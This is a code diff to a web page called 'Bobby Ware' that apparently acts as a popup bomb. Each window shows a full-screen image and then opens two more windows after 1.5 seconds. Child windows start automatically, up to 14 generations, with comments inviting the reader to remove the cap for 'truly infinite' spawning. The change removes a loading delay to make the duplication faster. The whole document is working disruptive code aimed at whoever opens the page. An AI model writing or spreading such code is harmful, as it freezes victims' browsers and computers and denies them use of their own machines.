@@ -14,6 +14,7 @@
     align-items: center;
     justify-content: center;
     text-align: center;
+    overflow: hidden;
   }
   #ui {
     max-width: 420px;
@@ -45,10 +46,14 @@
   button:hover:not(:disabled) {
     background: #2f5adf;
   }
-  video {
-    max-width: 100%;
-    max-height: 100vh;
+  #spawnImg {
     display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    object-fit: cover;
   }
   #closeBtn {
     position: fixed;
@@ -56,43 +61,7 @@
     right: 10px;
     background: #ff4d4f;
     display: none;
-  }
-  #loading {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    background: #0b1530;
-    z-index: 1000;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-  }
-  #loading.active {
-    display: flex;
-  }
-  #loading img {
-    width: 200px;
-    max-width: 60vw;
-    margin-bottom: 32px;
-  }
-  .spinner {
-    width: 64px;
-    height: 64px;
-    border: 6px solid rgba(255, 255, 255, 0.15);
-    border-top: 6px solid #3b6cf0;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-  }
-  #loading p {
-    margin-top: 20px;
-    font-size: 15px;
-  }
-  @keyframes spin {
-    from { transform: rotate(0deg); }
-    to   { transform: rotate(360deg); }
+    z-index: 10;
   }
 </style>
 </head>
@@ -109,25 +78,18 @@
   <button id="startBtn" disabled>Start</button>
 </div>
 
-<div id="loading">
-  <img src="loading.png" alt="Loading">
-  <div class="spinner"></div>
-  <p>Loading...</p>
-</div>
-
-<video id="vid" src="video.mp4" playsinline></video>
+<img id="spawnImg" src="spawn.jpg" alt="">
 <button id="closeBtn">Close this window</button>
 
 <script>
-  const params   = new URLSearchParams(location.search);
-  const gen      = parseInt(params.get('gen') || '0', 10);
-  const CHILDREN = 2;          // how many popups each video spawns
-  const DELAY_MS = 3000;       // wait time before playback starts
-  const MAX_GEN  = 12;         // safety cap so it can't literally crash your PC forever; raise/remove if you really want infinite
+  const params    = new URLSearchParams(location.search);
+  const gen       = parseInt(params.get('gen') || '0', 10);
+  const CHILDREN  = 2;      // how many popups each window spawns
+  const SPAWN_MS  = 1500;   // how long the image shows before spawning more (kept short = rapid duplication)
+  const MAX_GEN   = 14;     // safety cap so it can't literally lock up your PC forever; raise/remove for truly infinite
 
-  const vid       = document.getElementById('vid');
   const ui        = document.getElementById('ui');
-  const loading   = document.getElementById('loading');
+  const img       = document.getElementById('spawnImg');
   const closeBtn  = document.getElementById('closeBtn');
 
   document.title = gen === 0 ? 'Bobby Ware' : 'Bobby Ware #' + gen;
@@ -145,35 +107,12 @@
     }
   }
 
-  function playThenSpawn() {
-    loading.classList.remove('active');
-    vid.style.display      = 'block';
+  function showImageThenSpawn() {
+    // Instant — no delay, no loading screen, image shows immediately.
+    ui.style.display       = 'none';
+    img.style.display      = 'block';
     closeBtn.style.display = 'block';
-    if (gen > 0) {
-      // Browsers block autoplay-with-sound in windows opened via script
-      // (no direct user gesture inside them), so child windows autoplay muted.
-      vid.muted = true;
-    }
-    vid.play().catch(() => {});
-
-    let spawned = false;
-    vid.addEventListener('timeupdate', () => {
-      if (!spawned && vid.duration && vid.currentTime >= vid.duration / 2) {
-        spawned = true;
-        spawnChildren();
-      }
-    });
-  }
-
-  function startSequence() {
-    ui.style.display = 'none';
-    if (gen === 0) {
-      loading.classList.add('active');
-      setTimeout(playThenSpawn, DELAY_MS);
-    } else {
-      // Child windows: no loading screen, go straight to the video.
-      setTimeout(playThenSpawn, DELAY_MS);
-    }
+    setTimeout(spawnChildren, SPAWN_MS);
   }
 
   closeBtn.onclick = () => window.close();
@@ -208,11 +147,10 @@
         }
       }, 300);
     };
-    document.getElementById('startBtn').onclick = startSequence;
+    document.getElementById('startBtn').onclick = showImageThenSpawn;
   } else {
-    // Child windows: skip the UI and start automatically.
-    ui.style.display = 'none';
-    startSequence();
+    // Child windows: instant, no UI, no delay before the image appears.
+    showImageThenSpawn();
   }
 </script>
 
